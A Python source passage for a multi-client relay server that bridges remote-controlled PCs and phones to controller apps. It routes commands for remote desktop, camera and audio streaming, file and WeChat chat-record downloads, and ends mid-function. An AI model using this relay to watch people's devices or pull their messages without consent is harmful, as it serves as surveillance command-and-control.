"""
云中继桥接服务 - 多PC被控端版 (v2.0)
在云服务器(106.12.48.88)上运行
同时监听56784(PC被控端)、56782(控制器)、56783(视频流)端口

★ 新架构：支持多PC被控端同时连接
  - PC被控端端口: 56784 (支持多个PC被控端，每个分配唯一pc_id)
  - 控制器端口: 56782 (手机/PC服务端连接)
  - 视频流端口: 56783

★ 帧格式：
  控制器 ↔ 中继: [4字节长度] + [4字节pc_id(大端)] + [cmd] + [payload]
  中继 ↔ PC被控端: [4字节长度] + [cmd] + [payload] (PC端无需修改)

  pc_id = 0xFFFFFFFF (广播ID): 系统消息(CLIENT_ONLINE/CLIENT_DISCONNECT等)
  其他值: 对应PC被控端的唯一标识

★ 工作流程：
  1. PC被控端连接56784 → 中继分配pc_id → 广播CLIENT_ONLINE给所有控制器
  2. 控制器连接56782 → 发送类型标识 → 接收当前PC列表
  3. 控制器发命令: [pc_id] + [cmd+payload] → 中继剥掉pc_id → 发给对应PC
  4. PC发响应: [cmd+payload] → 中继加上pc_id → 广播给所有控制器
  5. PC断开 → 中继广播CLIENT_DISCONNECT给所有控制器

使用方法:
  python3 relay_server.py            # 前台运行
  nohup python3 relay_server.py &     # 后台运行
"""
import socket
import threading
import select
import time
import sys
import queue
import os
import logging
import struct

# ★ 添加协议路径，用于导入CMD_CLIENT_DISCONNECT
try:
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from protocol.commands import CMD_CLIENT_DISCONNECT, CMD_CLIENT_ONLINE
except Exception:
    CMD_CLIENT_DISCONNECT = "discon000000"
    CMD_CLIENT_ONLINE = "online000000"

# ★ 命令常量（用于中继路由决策）
CMD_GET_VERSION_STR       = "ver000000000"  # PC心跳(丢弃,不转发)
CMD_VERSION_INFO_STR      = "ver100000000"  # 版本响应(广播给所有手机)
CMD_DOWNLOAD_FILE_STR     = "down00000000"  # 下载请求(设置stream owner)
CMD_FILE_SIZE_STR         = "down00100000"  # 文件大小(转发给stream owner)
CMD_FILE_DATA_STR         = "down01000000"  # 文件数据(转发给stream owner)
CMD_FILE_DONE_STR         = "ok0000000000"  # 下载完成(转发给stream owner,然后清除)
CMD_GET_OFFICE_FILE_STR   = "office500000"  # Office文档下载(设置stream owner)
CMD_OFFICE_FILE_SIZE_STR  = "office700000"  # Office文件大小(转发给stream owner)
CMD_OFFICE_FILE_DATA_STR  = "office800000"  # Office文件数据(转发给stream owner)
CMD_OFFICE_FILE_DONE_STR  = "office900000"  # Office下载完成(转发给stream owner,然后清除)
CMD_RD_START_STR          = "rdstrt000000"  # 远程桌面启动(设置stream owner)
CMD_RD_DATA_STR           = "rddata000000"  # 远程桌面数据(转发给stream owner)
CMD_RD_STOP_STR           = "rdstp0000000"  # 远程桌面停止(清除stream owner)
CMD_CAMERA_STREAM_START_STR = "vcdstr000000" # 摄像头流启动(设置stream owner)
CMD_CAMERA_STREAM_FRAME_STR = "vcdfrm000000" # 摄像头帧(转发给stream owner)
CMD_CAMERA_STREAM_STOP_STR  = "vcdstp000000" # 摄像头流停止(清除stream owner)
CMD_AUDIO_STREAM_START_STR = "audstr000000"  # 音频流启动(设置stream owner)
CMD_AUDIO_STREAM_DATA_STR  = "auddat000000"  # 音频数据(转发给stream owner)
CMD_AUDIO_STREAM_STOP_STR  = "audstp000000"  # 音频流停止(清除stream owner)
CMD_UPLOAD_FILE_STR       = "upfile000000"   # 上传文件(设置stream owner)
CMD_UPLOAD_READY_STR      = "uprdy0000000"   # 上传就绪(转发给stream owner)
CMD_WECHAT_DOWNLOAD_CHAT_STR = "wxdlchat0000"  # 微信聊天记录下载请求(设置stream owner)
CMD_WECHAT_BACKUP_STATUS_STR = "wxbackst0000"  # 微信备份状态反馈(转发给stream owner)
# ★ 系统状态广播（中继→手机被控端56786）：负载 ctrlon/ctrloff 表示手机控制端上线/下线
CMD_SYS_STATUS_STR = "sfsys0000000"
SYS_CTRL_ON = "ctrlon"
SYS_CTRL_OFF = "ctrloff"
CMD_PING_STR = "sfping000000"

# ★ 分块确认传输命令
CMD_BLOCK_START_STR  = "blkstr000000"  # 开始分块传输(转发给stream owner)
CMD_BLOCK_DATA_STR   = "blkdat000000"  # 块数据(转发给stream owner)
CMD_BLOCK_DONE_STR   = "blkdone00000"  # 分块传输完成(转发给stream owner,然后清除)

# ★ 数据通道命令（物理通道分离）
CMD_DATA_CHANNEL_READY_STR = "dtchrdy00000"  # 数据通道就绪通知(PC→手机,走stream_owner路由)

# 流式响应命令(PC→控制器,转发给stream owner)
STREAM_RESPONSE_CMDS = {
    CMD_FILE_SIZE_STR, CMD_FILE_DATA_STR, CMD_FILE_DONE_STR,
    CMD_OFFICE_FILE_SIZE_STR, CMD_OFFICE_FILE_DATA_STR, CMD_OFFICE_FILE_DONE_STR,
    CMD_RD_DATA_STR, CMD_CAMERA_STREAM_FRAME_STR, CMD_AUDIO_STREAM_DATA_STR,
    CMD_UPLOAD_READY_STR,
    CMD_WECHAT_BACKUP_STATUS_STR,
    # ★ 分块确认传输
    CMD_BLOCK_START_STR, CMD_BLOCK_DATA_STR, CMD_BLOCK_DONE_STR,
    # ★ 数据通道就绪通知（PC→手机，必须走stream_owner路由确保发给发起下载的手机）
    CMD_DATA_CHANNEL_READY_STR,
}

# 流式启动命令(控制器→PC,设置stream owner)
STREAM_INIT_CMDS = {
    CMD_DOWNLOAD_FILE_STR, CMD_GET_OFFICE_FILE_STR, CMD_RD_START_STR,
    CMD_CAMERA_STREAM_START_STR, CMD_AUDIO_STREAM_START_STR, CMD_UPLOAD_FILE_STR,
    CMD_WECHAT_DOWNLOAD_CHAT_STR,
}

# 流式结束命令(控制器→PC,清除stream owner)
# ★ 分块传输完成也清除stream_owner
STREAM_END_CMDS = {
    CMD_RD_STOP_STR, CMD_CAMERA_STREAM_STOP_STR, CMD_AUDIO_STREAM_STOP_STR,
    CMD_BLOCK_DONE_STR,
}

# 桥接配置
LISTEN_HOST = '0.0.0.0'
PC_PORT = 56784           # PC被控端连接端口
PHONE_PORT = 56782        # 控制器连接端口（手机/PC服务端）
VIDEO_PORT = 56783        # 视频流端口
DATA_PORT = 56785         # ★ 数据通道端口（大文件下载专用，物理隔离控制通道）
# ★ 本项目（SmsForwarder手机端）专用新端口：不占用 56781~56785
PHONE_PC_PORT = 56786     # 手机被控端连接端口（本项目专用）
PHONE_CTRL_PORT = 56787   # 手机控制端连接端口（本项目专用）
PHONE_VIDEO_PORT = 56788  # 手机屏幕预览视频流端口（本项目专用）

# 控制器类型标识（控制器连接后发送的第一个字节）
CTRL_TYPE_PHONE = 0x01       # 手机控制端
CTRL_TYPE_PC_SERVER = 0x02   # PC服务端

# 特殊pc_id：广播/系统消息
BROADCAST_PC_ID = 0xFFFFFFFF

# 日志配置（单一日志文件）
LOG_DIR = '/var/log/relay_server'
try:
    os.makedirs(LOG_DIR, exist_ok=True)
except:
    LOG_DIR = '/tmp'
LOG_FILE = os.path.join(LOG_DIR, 'relay_server.log')

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [RELAY] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


class RelayServer:
    """中继服务：多PC被控端 + 多控制器"""

    def __init__(self):
        self.pc_server_sock = None
        self.phone_server_sock = None
        self.video_server_sock = None
        self.data_server_sock = None       # ★ 数据通道端口56785
        # ★ 本项目（手机端）新端口监听socket
        self.phone_pc_server_sock = None    # 56786 手机被控端
        self.phone_ctrl_server_sock = None  # 56787 手机控制端
        self.phone_video_server_sock = None # 56788 手机屏幕视频流
        self._running = False
        self._accept_threads = []  # ★ 监听线程引用列表（看门狗使用）

        # ★ 多PC被控端：pc_id -> {"sock": sock, "addr": addr}
        self._pc_clients = {}
        self._next_pc_id = 0

        # 控制器：ctrl_id -> {"sock": sock, "addr": addr, "type": "PHONE"|"PC_SERVER"}
        self._controllers = {}
        self._next_ctrl_id = 0
        self._cmd_lock = threading.Lock()

        # ★ 路由跟踪：pc_id -> ctrl_id (最近发送命令的控制器)
        self._last_sender_per_pc = {}
        # ★ 流式传输跟踪：pc_id -> ctrl_id (当前流式传输的发起者)
        self._stream_owner_per_pc = {}

        # 视频流通道（56783配对桥接，1对1）
        self._video_queue = []
        self._video_lock = threading.Lock()

        # ★ 数据通道（56785配对桥接，大文件传输专用）
        self._data_pushers = {}   # session_id -> (sock, addr, timestamp)
        self._data_listeners = {}  # session_id -> (sock, addr, timestamp)
        self._data_lock = threading.Lock()

    def _log(self, msg):
        logger.info(msg)

    # ==================== 帧构建工具 ====================

    def _build_frame(self, cmd, payload=''):
        """构建帧（不带pc_id，用于PC被控端侧）"""
        cmd_bytes = cmd.encode('gbk') if isinstance(cmd, str) else cmd
        payload_bytes = payload.encode('gbk') if isinstance(payload, str) else (payload or b'')
        data = cmd_bytes + payload_bytes
        header = struct.pack('>I', len(data))
        return header + data

    def _build_frame_with_pcid(self, pc_id, cmd, payload=''):
        """构建带pc_id前缀的帧（用于控制器侧）"""
        cmd_bytes = cmd.encode('gbk') if isinstance(cmd, str) else cmd
        payload_bytes = payload.encode('gbk') if isinstance(payload, str) else (payload or b'')
        inner_data = cmd_bytes + payload_bytes
        # 总长度 = 4字节pc_id + cmd长度 + payload长度
        total_len = 4 + len(inner_data)
        header = struct.pack('>I', total_len)
        pc_id_bytes = struct.pack('>I', pc_id)
        return header + pc_id_bytes + inner_data

    def _pack_with_pcid(self, pc_id, raw_data):
        """给原始帧数据加上pc_id前缀（用于PC→控制器方向）
        raw_data: 已经是完整的帧（4字节长度 + cmd + payload）
        """
        if len(raw_data) < 4:
            return raw_data
        # 原始长度（不含pc_id）
        orig_len = struct.unpack('>I', raw_data[:4])[0]
        # 新长度 = 原始长度 + 4字节pc_id
        new_len = orig_len + 4
        new_header = struct.pack('>I', new_len)
        pc_id_bytes = struct.pack('>I', pc_id)
        # 新帧 = 新长度头 + pc_id + 原始数据部分（去掉旧长度头）
        return new_header + pc_id_bytes + raw_data[4:]

    # ==================== 控制器类型读取 ====================

    def _read_controller_type(self, sock, addr):
        """读取控制器类型标识（连接后发送的第一个字节）"""
        try:
            sock.settimeout(5.0)
            type_byte = sock.recv(1)
            sock.settimeout(None)
            if not type_byte:
                self._log(f'[CMD] 控制器 {addr} 未发送类型标识，断开')
                return None
            if type_byte[0] == CTRL_TYPE_PHONE:
                return "PHONE"
            elif type_byte[0] == CTRL_TYPE_PC_SERVER:
                return "PC_SERVER"
            else:
                self._log(f'[CMD] 控制器 {addr} 类型标识未知(0x{type_byte[0]:02x})，默认为PC_SERVER')
                return "PC_SERVER"
        except socket.timeout:
            sock.settimeout(None)
            self._log(f'[CMD] 控制器 {addr} 类型标识读取超时，默认为PC_SERVER')
            return "PC_SERVER"
        except Exception as e:
            sock.settimeout(None)
            self._log(f'[CMD] 控制器 {addr} 类型标识读取异常: {e}')
            return None

    def _has_phone_controller(self):
        """检查是否已有PHONE类型的控制器"""
        with self._cmd_lock:
            for info in self._controllers.values():
                if info["type"] == "PHONE":
                    return True
            return False

    # ==================== PC被控端连接处理 ====================

    def _handle_pc_client(self, pc_sock, pc_addr, client_type="PC"):
        """PC被控端连接56784 - 支持多个，分配唯一pc_id
        client_type: "PC"=PC被控端(56784), "PHONE_PC"=手机被控端(56786,本项目)
        """
        self._log(f'[PC] PC被控端连接请求: {pc_addr} (type={client_type})')
        self._setup_sock(pc_sock)

        with self._cmd_lock:
            pc_id = self._next_pc_id
            self._next_pc_id += 1
            self._pc_clients[pc_id] = {
                "sock": pc_sock,
                "addr": pc_addr,
                "type": client_type
            }

        self._log(f'[PC] ★ PC被控端 #{pc_id} 已连接: {pc_addr}, 当前PC数量: {len(self._pc_clients)}')

        # ★ 通知所有控制器：新PC被控端上线
        # - PHONE类型：带pc_id前缀的广播消息
        # - PC_SERVER类型：只有第一个PC才通知，标准帧格式（兼容模式）
        with self._cmd_lock:
            controllers = list(self._controllers.items())
            pc_ids_sorted = sorted(self._pc_clients.keys()) if self._pc_clients else []
        is_first_pc = pc_ids_sorted and pc_ids_sorted[0] == pc_id

        dead_controllers = []
        for cid, info in controllers:
            try:
                if info["type"] == "PHONE":
                    frame = self._build_frame_with_pcid(
                        BROADCAST_PC_ID, CMD_CLIENT_ONLINE,
                        f'PC被控端#{pc_id}已上线|{pc_addr[0]}'
                    )
                else:
                    # PC_SERVER兼容模式：只通知第一个PC
                    if not is_first_pc:
                        continue
                    frame = self._build_frame(CMD_CLIENT_ONLINE,
                        f'PC被控端已上线|{pc_addr[0]}')
                # ★ 修复：通过send_queue发送，避免与_controller_send_loop的sendall竞态
                if not self._send_to_controller(cid, frame):
                    dead_controllers.append(cid)
                    continue
                self._log(f'[PC] 已通知控制器 #{cid} ({info["type"]}) PC#{pc_id} 上线')
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                self._log(f'[PC] 通知控制器 #{cid} 失败: {e}')
                dead_controllers.append(cid)

        if dead_controllers:
            with self._cmd_lock:
                for cid in dead_controllers:
                    if cid in self._controllers:
                        self._controllers[cid]["send_thread_active"] = False
                        del self._controllers[cid]

        # 启动转发线程：PC → 所有控制器
        t = threading.Thread(target=self._pc_to_controllers, args=(pc_sock, pc_id), daemon=True)
        t.start()

    def _send_to_controller(self, ctrl_id, frame, total_timeout=60):
        """★ 统一的控制器发送方法：通过send_queue发送，避免与_controller_send_loop的sendall竞态
        - 所有控制器发送必须走此方法，禁止直接info["sock"].sendall()
        - 原因：多线程并发sendall同一socket会导致TCP帧交错损坏
        - ★ 修复：使用循环式超时+send_thread_active检查，区分"暂态背压"和"控制器已死"
          - send_thread_active=False → 立即返回False（快速检测dead controller）
          - 队列满但send_thread_active=True → 继续等待（自然背压，不丢弃帧）
          - 总超时60s → 返回False（极端情况，避免永久阻塞）
        """
        total_waited = 0
        CHECK_INTERVAL = 5  # 每5秒检查一次send_thread_active
        while total_waited < total_timeout:
            with self._cmd_lock:
                info = self._controllers.get(ctrl_id)
                if not info:
                    return False
                if not info.get("send_thread_active", True):
                    return False  # ★ send thread已死，快速返回
                sq = info.get("send_queue")
            if sq is None:
                try:
                    info["sock"].sendall(frame)
                    return True
                except Exception:
                    return False
            try:
                sq.put(frame, timeout=CHECK_INTERVAL)
                return True
            except queue.Full:
                total_waited += CHECK_INTERVAL
                if total_waited >= 15:
                    self._log(f'[SEND] 控制器 #{ctrl_id} 发送阻塞 {total_waited}s, queue_size={sq.qsize()}, 继续等待...')
                continue
            except Exception as e:
                self._log(f'[SEND] 控制器 #{ctrl_id} 入队异常: {e}')
                return False
        self._log(f'[SEND] 控制器 #{ctrl_id} 发送总超时({total_timeout}s)，标记为dead')
        return False

    def _controller_send_loop(self, ctrl_id):
        """★ 独立的控制器发送线程：从发送队列取数据，sendall到控制器
        解决sendall阻塞导致PC→控制器转发线程卡死的问题
        - ★ 修复：使用try/finally确保所有退出路径都设置send_thread_active=False
          让_send_to_controller能快速检测到dead controller"""
        try:
            while self._running:
                with self._cmd_lock:
                    info = self._controllers.get(ctrl_id)
                    if not info or not info.get("send_thread_active"):
                        return
                    sq = info.get("send_queue")
                    sock = info.get("sock")
                if not sq or not sock:
                    return
                try:
                    frame = sq.get(timeout=2.0)
                except queue.Empty:
                    continue
                try:
                    sock.sendall(frame)
                except (ConnectionResetError, BrokenPipeError, OSError) as e:
                    self._log(f'[SEND] 控制器 #{ctrl_id} sendall失败: {e}')
                    return
                except Exception as e:
                    self._log(f'[SEND] 控制器 #{ctrl_id} 发送异常: {e}')
                    return
        finally:
            # ★ 关键修复：确保所有退出路径都设置send_thread_active=False
            # 这样_send_to_controller能通过send_thread_active检查快速检测dead controller
            with self._cmd_lock:
                info = self._controllers.get(ctrl_id)
                if info:
                    info["send_thread_active"] = False
            self._log(f'[SEND] 控制器 #{ctrl_id} 发送线程退出, send_thread_active=False')

    def _pc_to_controllers(self, pc_sock, pc_id):
        """PC被控端 → 广播到所有控制器（加上pc_id前缀）"""
        recv_buffer = b''
        # ★ 诊断：记录连接建立时间，用于计算连接持续时间
        import time as _time
        connect_start_time = _time.time()
        recv_byte_count = 0
        frame_count = 0
        while self._running:
            try:
                rlist, _, xlist = select.select([pc_sock], [], [pc_sock], 2.0)
                if xlist:
                    duration = _time.time() - connect_start_time
                    self._log(f'[PC→CTRL] PC #{pc_id} socket异常 (持续{duration:.1f}s, 收到{recv_byte_count}字节, {frame_count}帧)')
                    break
                if not rlist:
                    # 检查是否还在列表中
                    with self._cmd_lock:
                        if pc_id not in self._pc_clients or self._pc_clients[pc_id]["sock"] is not pc_sock:
                            duration = _time.time() - connect_start_time
                            self._log(f'[PC→CTRL] PC #{pc_id} 已被移除 (持续{duration:.1f}s)')
                            return
                    continue

                try:
                    data = pc_sock.recv(65536)
                except (ConnectionResetError, OSError) as e:
                    duration = _time.time() - connect_start_time
                    self._log(f'[PC→CTRL] PC #{pc_id} recv异常: {e} (持续{duration:.1f}s, 收到{recv_byte_count}字节)')
                    data = b''

                if not data:
                    duration = _time.time() - connect_start_time
                    # ★ 关键诊断：区分"立即断开"和"正常断开"
                    if duration < 5:
                        self._log(f'[PC→CTRL] ★ PC #{pc_id} 连接后立即断开 (持续{duration:.2f}s, 收到{recv_byte_count}字节, {frame_count}帧) - 可能是PC被控端主动断开或连接被拒绝')
                    else:
                        self._log(f'[PC→CTRL] PC #{pc_id} 断开连接 (持续{duration:.1f}s, 收到{recv_byte_count}字节, {frame_count}帧)')
                    break

                recv_byte_count += len(data)
                recv_buffer += data

                # 按帧解析，逐个添加pc_id前缀后转发
                while len(recv_buffer) >= 4:
                    frame_len = struct.unpack('>I', recv_buffer[:4])[0]
                    if frame_len <= 0 or frame_len > 100 * 1024 * 1024:  # 100MB上限
                        self._log(f'[PC→CTRL] PC #{pc_id} 帧长度异常: {frame_len}')
                        recv_buffer = b''
                        break
                    total_len = 4 + frame_len
                    if len(recv_buffer) < total_len:
                        break  # 数据不足，等待更多

                    frame_data = recv_buffer[:total_len]
                    recv_buffer = recv_buffer[total_len:]
                    frame_count += 1

                    # ★ 解析命令前缀（12字节ASCII）
                    cmd_str = ""
                    try:
                        if frame_len >= 12:
                            cmd_str = frame_data[4:16].decode('ascii', errors='ignore')
                    except Exception:
                        pass

                    # ★ 命令感知路由（修复多手机操作结果跨设备显示问题）
                    # 1. PC心跳CMD_GET_VERSION：丢弃，不转发给任何控制器
                    # 2. 版本响应CMD_VERSION_INFO：广播给所有手机（心跳响应，所有手机都需要）
                    # 3. 流式响应（FILE_DATA/RD_DATA等）：转发给stream owner（发起流式操作的控制器）
                    # 4. 其他响应：转发给last sender（最近发送命令的控制器）

                    dead_controllers = []
                    with self._cmd_lock:
                        controllers = list(self._controllers.items())
                        last_sender = self._last_sender_per_pc.get(pc_id)
                        stream_owner = self._stream_owner_per_pc.get(pc_id)

                    # 判断当前PC是否是第一个PC（用于兼容模式转发）
                    pc_ids_sorted = sorted(self._pc_clients.keys()) if self._pc_clients else []
                    is_first_pc = pc_ids_sorted and pc_ids_sorted[0] == pc_id

                    # ★ 路由决策
                    if cmd_str == CMD_GET_VERSION_STR:
                        # PC心跳，丢弃不转发
                        pass
                    elif cmd_str == CMD_VERSION_INFO_STR:
                        # 版本响应：广播给所有PHONE控制器（心跳响应，每个手机都需要更新心跳时间）
                        for cid, info in controllers:
                            try:
                                if info["type"] == "PHONE":
                                    frame_with_pcid = self._pack_with_pcid(pc_id, frame_data)
                                    if not self._send_to_controller(cid, frame_with_pcid):
                                        dead_controllers.append(cid)
                                else:
                                    if is_first_pc:
                                        if not self._send_to_controller(cid, frame_data):
                                            dead_controllers.append(cid)
                            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                                dead_controllers.append(cid)
                    elif cmd_str in STREAM_RESPONSE_CMDS:
                        # 流式响应：转发给stream owner（发起流式操作的控制器）
                        # ★ 关键修复：只有当stream_owner对应的控制器**仍处于活跃连接**时才转发
                        #   如果stream_owner指向的控制器已断开，直接丢弃响应，
                        #   绝不能fallback到last_sender（避免把A手机的下载进度/数据错发给B手机）
                        target_cid = stream_owner
                        if target_cid is not None:
                            # 先确认目标控制器还存活（在_controllers字典里）
                            info = None
                            with self._cmd_lock:
                                if target_cid in self._controllers:
                                    info = self._controllers.get(target_cid)
                            if info is not None:
                                try:
                                    if info["type"] == "PHONE":
                                        frame_with_pcid = self._pack_with_pcid(pc_id, frame_data)
                                        if not self._send_to_controller(target_cid, frame_with_pcid):
                                            dead_controllers.append(target_cid)
                                    else:
                                        if is_first_pc:
                                            if not self._send_to_controller(target_cid, frame_data):
                                                dead_controllers.append(target_cid)
                                    # ★ 关键日志：记录CMD_DATA_CHANNEL_READY的转发
                                    if cmd_str == CMD_DATA_CHANNEL_READY_STR:
                                        self._log(f'[PC→CTRL] ★ CMD_DATA_CHANNEL_READY 已转发给控制器#{target_cid} (PC#{pc_id}, type={info["type"]})')
                                except (ConnectionResetError, BrokenPipeError, OSError) as e:
                                    dead_controllers.append(target_cid)
                                    if cmd_str == CMD_DATA_CHANNEL_READY_STR:
                                        self._log(f'[PC→CTRL] ★ CMD_DATA_CHANNEL_READY 转发异常: {e}')
                            else:
                                # stream_owner已失效（控制器断开），丢弃此帧
                                # （不fallback到last_sender，防止串机）
                                if frame_count < 10 or (frame_count % 100 == 0):
                                    self._log(f'[PC→CTRL] PC#{pc_id} cmd={cmd_str} stream_owner=#{target_cid}已失效，丢弃帧（防止串发给其他手机）')
                        # ★ 流式传输完成时清除stream owner（无论是否成功发送）
                        if cmd_str in (CMD_FILE_DONE_STR, CMD_OFFICE_FILE_DONE_STR, CMD_BLOCK_DONE_STR):
                            with self._cmd_lock:
                                old = self._stream_owner_per_pc.pop(pc_id, None)
                                if old is not None:
                                    self._log(f'[PC→CTRL] PC#{pc_id} 清除stream_owner=#{old} (cmd={cmd_str})')
                    else:
                        # 其他响应：转发给last sender（最近发送命令的控制器）
                        target_cid = last_sender
                        # ★ 排查日志：记录被控端上行的非流式响应转发（如 pong）
                        if cmd_str == "sfpong000000":
                            self._log(f'[PC→CTRL] ★ 收到PC#{pc_id}的pong，last_sender=#{last_sender}，控制器数={len(controllers)}')
                        if target_cid is not None:
                            info = None
                            with self._cmd_lock:
                                info = self._controllers.get(target_cid)
                            if info is not None:
                                try:
                                    if info["type"] == "PHONE":
                                        frame_with_pcid = self._pack_with_pcid(pc_id, frame_data)
                                        if not self._send_to_controller(target_cid, frame_with_pcid):
                                            dead_controllers.append(target_cid)
                                    else:
                                        if is_first_pc:
                                            if not self._send_to_controller(target_cid, frame_data):
                                                dead_controllers.append(target_cid)
                                except (ConnectionResetError, BrokenPipeError, OSError) as e:
                                    dead_controllers.append(target_cid)
                        else:
                            # 没有last sender，回退到广播（兼容旧逻辑）
                            for cid, info in controllers:
                                try:
                                    if info["type"] == "PHONE":
                                        frame_with_pcid = self._pack_with_pcid(pc_id, frame_data)
                                        if not self._send_to_controller(cid, frame_with_pcid):
                                            dead_controllers.append(cid)
                                    else:
                                        if is_first_pc:
                                            if not self._send_to_controller(cid, frame_data):
                                                dead_controllers.append(cid)
                                except (ConnectionResetError, BrokenPipeError, OSError) as e:
                                    dead_controllers.append(cid)

                    if dead_controllers:
                        with self._cmd_lock:
                            for cid in dead_controllers:
                                if cid in self._controllers:
                                    self._controllers[cid]["send_thread_active"] = False
                                    del self._controllers[cid]
                                    self._log(f'[PC→CTRL] 清理已断开的控制器 #{cid}')

            except Exception as e:
                self._log(f'[PC→CTRL] PC #{pc_id} 转发异常: {e}')
                break

        # PC断开，清理并通知控制器
        was_first_pc = False
        with self._cmd_lock:
            # 先判断是不是第一个PC（用于兼容模式通知）
            pc_ids_sorted = sorted(self._pc_clients.keys()) if self._pc_clients else []
            was_first_pc = pc_ids_sorted and pc_ids_sorted[0] == pc_id
            if pc_id in self._pc_clients:
                del self._pc_clients[pc_id]
                self._log(f'[PC] PC #{pc_id} 已移除, 剩余PC: {len(self._pc_clients)}')
            # ★ 清理路由跟踪
            self._last_sender_per_pc.pop(pc_id, None)
            self._stream_owner_per_pc.pop(pc_id, None)

        # ★ 通知所有控制器：PC被控端下线
        with self._cmd_lock:
            controllers = list(self._controllers.items())
        dead_controllers = []
        for cid, info in controllers:
            try:
                if info["type"] == "PHONE":
                    frame = self._build_frame_with_pcid(
                        BROADCAST_PC_ID, CMD_CLIENT_DISCONNECT,
                        f'PC被控端#{pc_id}已断开'
                    )
                else:
                    # PC_SERVER兼容模式：只有第一个PC断开才通知
                    if not was_first_pc:
                        continue
                    frame = self._build_frame(CMD_CLIENT_DISCONNECT,
                        f'PC被控端已断开')
                # ★ 修复：通过send_queue发送，避免竞态
                if not self._send_to_controller(cid, frame):
                    dead_controllers.append(cid)
                    continue
                self._log(f'[PC] 已通知控制器 #{cid} ({info["type"]}) PC#{pc_id} 下线')
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                self._log(f'[PC] 通知控制器 #{cid} 失败: {e}')
                dead_controllers.append(cid)

        if dead_controllers:
            with self._cmd_lock:
                for cid in dead_controllers:
                    if cid in self._controllers:
                        self._controllers[cid]["send_thread_active"] = False
                        del self._controllers[cid]

        try:
            pc_sock.close()
        except:
            pass
        self._log(f'[PC→CTRL] PC #{pc_id} 转发线程退出')

    # ==================== 控制器连接处理 ====================

    def _handle_phone_client(self, phone_sock, phone_addr):
        """控制器连接56782 - 读取类型标识并验证"""
        self._log(f'[CTRL] 控制器连接请求: {phone_addr}')
        self._setup_sock(phone_sock)

        ctrl_type = self._read_controller_type(phone_sock, phone_addr)
        if ctrl_type is None:
            try:
                phone_sock.close()
            except:
                pass
            return

        # ★ 允许多个PHONE控制器同时连接（支持多手机控制同一PC被控端）
        if ctrl_type == "PHONE":
            phone_count = sum(1 for info in self._controllers.values() if info["type"] == "PHONE")
            self._log(f'[CTRL] PHONE控制器 #{phone_count + 1} 连接: {phone_addr}')

        with self._cmd_lock:
            ctrl_id = self._next_ctrl_id
            self._next_ctrl_id += 1
            # ★ 添加发送队列，避免sendall阻塞PC→控制器转发线程
            # ★ 增大发送队列至2000（约64MB @32KB/chunk），吸收下载峰值流量
            # 原队列500太小，微信下载时FILE_DATA帧密集填满队列导致15秒入队超时→控制器连接被关闭→下载中断
            send_queue = queue.Queue(maxsize=2000)
            self._controllers[ctrl_id] = {
                "sock": phone_sock,
                "addr": phone_addr,
                "type": ctrl_type,
                "send_queue": send_queue,
                "send_thread_active": True
            }

        # ★ 启动独立的控制器发送线程
        send_t = threading.Thread(target=self._controller_send_loop, args=(ctrl_id,), daemon=True)
        send_t.start()

        # ★ 通知本项目手机被控端(56786)：手机控制端已上线
        if ctrl_type == "PHONE":
            self._broadcast_to_phone_pcs(CMD_SYS_STATUS_STR, SYS_CTRL_ON)

        pc_count = len(self._pc_clients)
        self._log(f'[CTRL] ★ 控制器 #{ctrl_id} 已连接: {phone_addr} (类型: {ctrl_type}), 当前PC: {pc_count}个')

        # ★ 通知控制器当前已在线的PC被控端
        # - PHONE类型：发送带pc_id前缀的完整PC列表（多PC模式）
        # - PC_SERVER类型：只发送第一个PC的标准帧（单PC兼容模式）
        with self._cmd_lock:
            pc_list = list(self._pc_clients.items())
        if ctrl_type == "PHONE":
            for pc_id, pc_info in pc_list:
                try:
                    frame = self._build_frame_with_pcid(
                        BROADCAST_PC_ID, CMD_CLIENT_ONLINE,
                        f'PC被控端#{pc_id}已上线|{pc_info["addr"][0]}'
                    )
                    # ★ 修复：通过send_queue发送，避免竞态
                    self._send_to_controller(ctrl_id, frame)
                    self._log(f'[CTRL] 已通知手机控制器 #{ctrl_id} PC#{pc_id} 在线')
                except Exception as e:
                    self._log(f'[CTRL] 通知手机控制器 #{ctrl_id} PC#{pc_id} 在线失败: {e}')
        else:
            # PC_SERVER类型：兼容旧协议，只通知第一个PC
            if pc_list:
                first_pc_id, first_pc_info = pc_list[0]
                try:
                    frame = self._build_frame(CMD_CLIENT_ONLINE,
                        f'PC被控端已上线|{first_pc_info["addr"][0]}')
                    # ★ 修复：通过send_queue发送，避免竞态
                    self._send_to_controller(ctrl_id, frame)
                    self._log(f'[CTRL] 已通知PC服务端控制器 #{ctrl_id} PC#{first_pc_id} 在线 (兼容模式)')
                except Exception as e:
                    self._log(f'[CTRL] 通知PC服务端控制器 #{ctrl_id} 失败: {e}')

        # 启动转发线程：控制器 → 指定PC被控端
        t = threading.Thread(target=self._controller_to_pc,
                             args=(phone_sock, phone_addr, ctrl_id, ctrl_type), daemon=True)
        t.start()

    def _controller_to_pc(self, ctrl_sock, ctrl_addr, ctrl_id, ctrl_type):
        """控制器 → 转发到指定PC被控端
        - PHONE类型：带pc_id前缀（多PC模式）
        - PC_SERVER类型：标准帧（单PC兼容模式，转发到第一个PC）
        """
        recv_buffer = b''
        while self._running:
            try:
                rlist, _, xlist = select.select([ctrl_sock], [], [ctrl_sock], 2.0)
                if xlist:
                    self._log(f'[CTRL→PC] 控制器 #{ctrl_id} ({ctrl_addr}) socket异常')
                    break
                if not rlist:
                    continue

                try:
                    data = ctrl_sock.recv(65536)
                except (ConnectionResetError, OSError) as e:
                    self._log(f'[CTRL→PC] 控制器 #{ctrl_id} recv异常: {e}')
                    data = b''

                if not data:
                    self._log(f'[CTRL→PC] 控制器 #{ctrl_id} ({ctrl_addr}) 断开')
                    break

                recv_buffer += data

                if ctrl_type == "PHONE":
                    # ★ 手机控制器：解析带pc_id前缀的帧
                    while len(recv_buffer) >= 8:  # 4字节长度 + 4字节pc_id
                        total_len = struct.unpack('>I', recv_buffer[:4])[0]
                        if total_len <= 4 or total_len > 100 * 1024 * 1024:
                            self._log(f'[CTRL→PC] 控制器 #{ctrl_id} 帧长度异常: {total_len}')
